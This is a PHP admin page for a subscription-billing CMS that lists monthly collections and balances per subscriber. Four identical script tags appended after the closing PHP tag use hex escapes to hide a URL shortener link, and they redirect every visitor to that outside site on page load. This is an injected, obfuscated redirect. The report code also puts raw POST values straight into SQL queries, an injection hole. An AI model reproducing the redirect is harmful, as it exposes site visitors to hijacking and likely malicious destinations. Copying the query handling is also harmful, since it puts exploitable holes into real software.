<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
$and='';
$status='P';
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    if(!empty($_POST['from_date']) && !empty($_POST['to_date'])){
        $from =$objMisc->changeDateFormat($_POST['from_date']);
        $to   =$objMisc->changeDateFormat($_POST['to_date']);
        $and .=" AND MONTH_DATE BETWEEN '$from' AND '$to'";
        $and1 .=" AND MC.`MONTH_DATE` BETWEEN '$from' AND '$to'";  
    }
    if(!empty($_POST['employee_id'])){
        $employee_id   =$_POST['employee_id'];
        $and .=" AND `ADDED_BY`='$employee_id' AND `ADDED_BY_TYPE`='E'";
    }
    $status=$_POST['status'];
    $rowArray=$_POST;
}

if($status=='P'){
    $and .=" AND MONTH(ADDED_TIME)=MONTH(CURRENT_DATE()) AND YEAR(ADDED_TIME)=YEAR(CURRENT_DATE()) AND `AMOUNT_TYPE`='D'";
}else{
    $status=$_POST['status'];
    $and .=" AND MONTH(ADDED_TIME)=MONTH(CURRENT_DATE()) AND YEAR(ADDED_TIME)=YEAR(CURRENT_DATE()) AND `AMOUNT_TYPE`='C'";
}
$wherethis = " 1=1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND STATUS='A' $and GROUP BY SUBSCRIBER_ID ORDER BY `ID` DESC";
$classRecord = $objMisc->getAllRecordsPaging("SUBSCRIBER_ID,AMOUNT,ADDED_TIME,RECEIPT_NO",'monthly_charges',$wherethis);
//print_r($classRecord);exit;
$i  = 1;
$pagin_recs = "";
$pagin_recs .= '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="5%">S.No</th><th width="10%">Customer ID/Mobile No</th><th width="25%">Subscriber Details</th><th>Collection Date</th><th width="7%">Collection</th><th width="7%">Balance</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
        //print_r($classRecord[1]);exit;
        foreach ($classRecord[1] as $k => $rowRec){    
            $balance=0;
            $debit=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND AMOUNT_TYPE='D'",'SUM(AMOUNT)','monthly_charges');
            $credit=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND AMOUNT_TYPE='C'",'SUM(AMOUNT)','monthly_charges');
            $balance=$debit-$credit;
            $row=$objMisc->getRow("subscribers","SUBSCRIBER_ID='$rowRec[subscriber_id]'");
            if($status=='C'){
                if($balance==0){
                    if($k%2==0) 
                    $pagin_recs .= '<tr class="odd gradeX">';
                    else
                    $pagin_recs .= '<tr class="even gradeX">';
                    
                    $pagin_recs .='<td>'.$i.'</td>';
                    $pagin_recs .='<td>'.$row['customer_id'].'<br>'.$row['phone_no'].'</td>';
                    $pagin_recs .='<td>'.$row['name'].'<br>'.$row['address'].'</td>';
                    $pagin_recs .='<td style="text-align:right;">'.date('d M,Y H:i A',strtotime($rowRec['added_time'])).'</td>';
                    $pagin_recs .='<td style="text-align:right;">'.$rowRec['amount'].'</td>';
                    $pagin_recs .='<td style="text-align:right;">'.$balance.'</td>';
                    $pagin_recs .= '</tr>';
                    $i++;
                }
            }else if($status=='P'){
                $recCur=$objMisc->GiveValue("SUBSCRIBER_ID='$rowRec[subscriber_id]' AND AMOUNT_TYPE='C' AND MONTH(ADDED_TIME)=MONTH(CURRENT_DATE()) AND YEAR(ADDED_TIME)=YEAR(CURRENT_DATE())",'SUBSCRIBER_ID','monthly_charges');
                if(empty($recCur)){
                    if($k%2==0) 
                    $pagin_recs .= '<tr class="odd gradeX">';
                    else
                    $pagin_recs .= '<tr class="even gradeX">';
                    
                    $pagin_recs .='<td>'.$i.'</td>';
                    $pagin_recs .='<td>'.$row['customer_id'].'<br>'.$row['phone_no'].'</td>';
                    $pagin_recs .='<td>'.$row['name'].'<br>'.$row['address'].'</td>';
                    $pagin_recs .='<td style="text-align:right;">'.date('d M,Y H:i A',strtotime($rowRec['added_time'])).'</td>';
                    $pagin_recs .='<td style="text-align:right;">'.$rowRec['amount'].'</td>';
                    $pagin_recs .='<td style="text-align:right;">'.$balance.'</td>';
                    $pagin_recs .= '</tr>';
                    $i++;
                }
            }else{
                if($k%2==0) 
                $pagin_recs .= '<tr class="odd gradeX">';
                else
                $pagin_recs .= '<tr class="even gradeX">';
                
                $pagin_recs .='<td>'.$i.'</td>';
                $pagin_recs .='<td>'.$row['customer_id'].'<br>'.$row['phone_no'].'</td>';
                $pagin_recs .='<td>'.$row['name'].'<br>'.$row['address'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.date('d M,Y H:i A',strtotime($rowRec['added_time'])).'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$rowRec['amount'].'</td>';
                $pagin_recs .='<td style="text-align:right;">'.$balance.'</td>';
                $pagin_recs .= '</tr>';
                $i++;
            }

        }
        $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="5">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="7" align="center">No Record Found</td></tr></tbody>';
    }
    
  
if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Collection Report";
}else{
   $pageheading = "Collection Report"; 
}
$whereEmp =   " 1 = 1 AND U.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and E.STATUS = 'A' order by E.NAME ASC";
$employeeArray          =   $objMisc->myFunc->fnWriteOptionListWithJoin($rowArray['employee_id'],"NAME,USER_ID,","SELECT U.`USER_ID`,E.`NAME` FROM `employees` E JOIN `users` U ON E.`EMPLOYEE_ID`=U.`ID` AND U.`USER_TYPE`='E' WHERE $whereEmp",0,0); 
$smartyVars['employeeArray']             =   $employeeArray;
$smartyVars['errormsg']             =   $errormsg;
$smartyVars['add']                  =   $add;
$smartyVars['group']                =   $id;
$smartyVars['rowRec']               =   $rowArray;
$smartyVars['pageheading']          =   $pageheading;
$smartyVars['classData']            =   $pagin_recs;
$smartyVars['msg']                  =   $msg;
$smartyVars['page']                 =   $_REQUEST['page'];

$objMisc->displayPage("header,collection-report,footer",$smartyVars);
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>